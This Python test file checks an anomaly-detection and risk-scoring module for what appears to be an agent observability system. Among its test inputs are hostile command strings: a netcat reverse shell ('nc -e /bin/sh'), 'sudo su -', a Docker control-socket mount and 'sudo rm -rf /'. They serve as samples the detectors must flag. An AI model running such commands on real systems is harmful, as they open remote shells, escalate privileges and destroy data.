#!/usr/bin/env python3
"""Tests for anomaly detection + risk scoring (Task 16).

Feature: ARO/ZAF observability (SRS §5.4, §5.5).

Validates:
* risk scoring is deterministic + explainable (same inputs -> same score +
  factor breakdown); monotonic in action sensitivity; clamped 0..100.
* each detector triggers on its scenario and is silent otherwise:
  repeated commands, excessive retries, suspicious process, privilege
  escalation, control-socket access, resource spikes, out-of-scope,
  repeated authz failures.
* analyze() aggregates anomalies + a risk snapshot.

Run directly:
    python3 tests/test_obs_anomaly_risk.py
Or via pytest:
    pytest tests/test_obs_anomaly_risk.py
"""
import os
import sys

from hypothesis import given, settings
from hypothesis import strategies as st

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from src.obs import anomaly_engine as ae  # noqa: E402
from src.obs import risk_scoring as rs  # noqa: E402


# --------------------------------------------------------------------------- #
# risk scoring
# --------------------------------------------------------------------------- #
def test_risk_deterministic_and_explainable():
    a = rs.score(action="openstack.server.delete", resource="prod-db", decision="DENY")
    b = rs.score(action="openstack.server.delete", resource="prod-db", decision="DENY")
    assert a.score == b.score
    names = {n for n, _ in a.factors}
    assert "action_sensitivity" in names
    assert "resource_criticality" in names
    assert "policy_violation" in names


def test_risk_clamped_and_severity_bands():
    high = rs.score(action="database.drop", resource="prod-x", decision="QUARANTINE",
                    behavioral_points=40, frequency=10)
    assert high.score == 100
    assert high.severity == "CRITICAL"
    low = rs.score(action="openstack.server.list", resource="dev")
    assert low.severity in ("INFO", "LOW")


@given(behavioral=st.integers(0, 200))
@settings(max_examples=100)
def test_risk_never_exceeds_100(behavioral):
    s = rs.score(action="delete", behavioral_points=behavioral)
    assert 0 <= s.score <= 100


def test_delete_scores_higher_than_list():
    d = rs.score(action="openstack.server.delete")
    l = rs.score(action="openstack.server.list")
    assert d.score > l.score


# --------------------------------------------------------------------------- #
# detectors
# --------------------------------------------------------------------------- #
def test_repeated_commands():
    out = ae.detect_repeated_commands(["ls"] * 6, threshold=5)
    assert out and out[0].rule_id == "execution.loop"
    assert ae.detect_repeated_commands(["ls", "ps"], threshold=5) == []


def test_excessive_retries():
    assert ae.detect_excessive_retries(5, threshold=4)
    assert ae.detect_excessive_retries(2, threshold=4) == []


def test_suspicious_and_escalation_and_socket():
    out = ae.detect_suspicious_processes([
        "nc -e /bin/sh 10.0.0.1 4444",
        "sudo su -",
        "mount /var/run/docker.sock",
    ])
    rule_ids = {a.rule_id for a in out}
    assert "process.suspicious" in rule_ids
    assert "process.privilege_escalation" in rule_ids
    assert "process.control_socket_access" in rule_ids
    # the socket finding is CRITICAL
    assert any(a.severity == "CRITICAL" for a in out if a.rule_id == "process.control_socket_access")


def test_resource_anomaly():
    assert ae.detect_resource_anomaly(95.0, 0, cpu_limit=90.0)
    assert ae.detect_resource_anomaly(10.0, 2 << 30, mem_limit=1 << 30)
    assert ae.detect_resource_anomaly(5.0, 1000) == []


def test_out_of_scope():
    out = ae.detect_out_of_scope(
        ["openstack.server.delete"], allowed_globs=["openstack.server.list"]
    )
    assert out and out[0].rule_id == "behavior.out_of_scope"
    assert ae.detect_out_of_scope(["openstack.server.list"], ["openstack.server.*"]) == []


def test_authz_failures():
    assert ae.detect_authz_failures(3, threshold=3)
    assert ae.detect_authz_failures(1, threshold=3) == []


def test_analyze_aggregates():
    result = ae.analyze({
        "commands": ["openstack.server.delete"] * 6,
        "failures": 5,
        "process_lines": ["sudo rm -rf /"],
        "requested_actions": ["openstack.server.delete"],
        "allowed_globs": ["openstack.server.list"],
        "action": "openstack.server.delete",
        "resource": "prod-db",
        "decision": "DENY",
    })
    assert len(result["anomalies"]) >= 3
    assert result["risk"]["score"] >= 60  # high aggregate risk
    assert result["risk"]["severity"] in ("HIGH", "CRITICAL")


if __name__ == "__main__":
    import pytest

    raise SystemExit(pytest.main([__file__, "-v"]))
